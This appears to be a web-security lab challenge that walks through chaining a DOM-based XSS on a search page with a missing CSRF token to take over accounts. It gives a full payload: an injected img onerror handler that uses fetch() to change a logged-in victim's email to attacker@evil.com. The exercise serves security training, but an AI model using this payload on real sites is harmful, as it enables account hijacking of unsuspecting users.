Chain #2: DOM XSS + CSRF = ATO Hard

Objective

Chain a DOM XSS vulnerability with CSRF to achieve account takeover. The search page has DOM XSS via innerHTML, and the email change endpoint has no CSRF token. Craft a URL that, when clicked by a logged-in victim, changes their email to yours.

Hints

The search page reflects the ?q= parameter via innerHTML. You can inject HTML and JavaScript. But you need the XSS to DO something useful — not just pop an alert.
POST /api/user/change-email takes {"email":"..."} and uses cookie auth with no CSRF token. If you can make the victim's browser send this request, you change their email.
Craft a search URL with an XSS payload that calls fetch() to change the email:
?q=<img src=x onerror="fetch('/api/user/change-email',{method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({email:'attacker@evil.com'})})">

Attack Chain

// 1. DOM XSS on search page
//    ?q=<img src=x onerror=PAYLOAD>

// 2. PAYLOAD = fetch to change email
fetch('/api/user/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    email: 'attacker@evil.com'
  })
});

// 3. Victim clicks link → email changed → ATO
